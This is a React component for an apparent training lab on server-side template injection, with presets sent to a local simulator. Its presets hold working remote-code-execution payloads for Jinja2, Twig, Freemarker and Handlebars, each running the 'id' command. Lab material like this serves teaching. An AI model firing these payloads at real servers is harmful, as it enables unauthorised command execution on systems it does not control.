import { GenericLab } from './GenericLab'
import { simulateSsti } from '../../utils/simulators/sstiSimulator'
import { useI18n } from '../../i18n'

export function SstiLab() {
  const { locale } = useI18n()
  const isRu = locale === 'ru'
  return (
    <GenericLab
      config={{
        vulnType: 'SSTI',
        defaultPayload: '{{7*7}}',
        payloadLabel: isRu ? 'Template payload' : 'Template payload',
        defaultScenario: { engine: 'jinja2', sandbox: false },
        scenarioControls: [
          {
            type: 'select',
            key: 'engine',
            label: isRu ? 'Шаблонизатор' : 'Template engine',
            options: [
              { value: 'jinja2', label: 'Jinja2 (Python)' },
              { value: 'twig', label: 'Twig (PHP)' },
              { value: 'freemarker', label: 'Freemarker (Java)' },
              { value: 'velocity', label: 'Velocity (Java)' },
              { value: 'erb', label: 'ERB (Ruby)' },
              { value: 'handlebars', label: 'Handlebars (Node)' }
            ]
          },
          { type: 'toggle', key: 'sandbox', label: 'sandbox enabled' }
        ],
        presets: [
          { id: 'math', title: 'Math probe {{7*7}}', payload: '{{7*7}}' },
          { id: 'jinja-rce', title: 'Jinja2 → RCE via __mro__', payload: "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}" },
          { id: 'twig', title: 'Twig _self + filter', payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" },
          { id: 'freemarker', title: 'Freemarker Execute', payload: '<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}' },
          { id: 'handlebars', title: 'Handlebars constructor', payload: "{{#with \"constructor\"}}{{#with split as |arr|}}{{this.constructor.constructor(\"return process.mainModule.require('child_process').execSync('id')\")()}}{{/with}}{{/with}}" }
        ],
        simulate: (payload, scenario, loc) => simulateSsti(payload, scenario, loc)
      }}
    />
  )
}
